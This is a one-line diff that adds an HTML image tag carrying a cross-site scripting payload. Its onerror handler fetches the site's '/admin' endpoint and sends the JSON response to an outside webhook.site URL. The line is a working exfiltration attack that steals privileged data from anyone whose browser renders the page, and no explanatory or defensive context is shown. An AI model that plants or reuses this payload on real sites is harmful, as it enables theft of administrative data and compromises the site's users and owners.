@@ -1,0 +1,1 @@
+<img src="x" onerror="fetch('/admin').then(response => response.json()).then(data => {fetch('https://webhook.site/e07b2f05-6342-4fd5-bf04-5a54fa96453d?data=' + encodeURIComponent(JSON.stringify(data)));});"/>
